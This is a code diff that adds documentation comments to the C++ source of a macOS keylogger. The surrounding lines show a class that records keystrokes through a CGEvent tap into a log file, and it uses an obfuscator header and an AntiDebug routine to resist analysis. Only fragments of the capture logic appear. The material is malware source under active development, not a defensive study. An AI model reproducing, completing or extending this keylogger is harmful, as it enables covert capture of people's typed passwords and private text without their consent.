@@ -3,6 +3,10 @@
 #include "../include/obfuscator.h"
 
 #if defined(__APPLE__)
+
+/**
+ * @brief Construct a new Mac Os Logger:: Mac Os Logger object
+ */
 MacOsLogger::MacOsLogger() : logFileName("recording.log"), counter(0)
 {
     initializeKeyMap();
@@ -14,6 +18,9 @@ MacOsLogger::MacOsLogger() : logFileName("recording.log"), counter(0)
     chmod(logFileName.c_str(), 0644);
 }
 
+/**
+ * @brief Destroy the Mac Os Logger:: Mac Os Logger object
+ */
 MacOsLogger::~MacOsLogger()
 {
     if (logFile.is_open())
@@ -22,6 +29,9 @@ MacOsLogger::~MacOsLogger()
     }
 }
 
+/**
+ * @brief This method will start the keylogger on macOS.
+ */
 void MacOsLogger::startLogging()
 {
     AntiDebug ad;
@@ -67,6 +77,14 @@ void MacOsLogger::startLogging()
     CFRunLoopRun();
 }
 
+/**
+ * @brief This is the callback function for the event tap.
+ * @param proxy -> The event tap proxy.
+ * @param type -> The event type.
+ * @param event -> The event.
+ * @param refcon -> The reference context.
+ * @return CGEventRef, the event reference.
+ */
 CGEventRef MacOsLogger::myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon)
 {
     MacOsLogger *logger = static_cast<MacOsLogger *>(refcon);
@@ -104,6 +122,9 @@ CGEventRef MacOsLogger::myCGEventCallback(CGEventTapProxy proxy, CGEventType typ
     return event;
 }
 
+/**
+ * @brief This is the key map for the macOS key codes.
+ */
 void MacOsLogger::initializeKeyMap()
 {
     keyMap = {
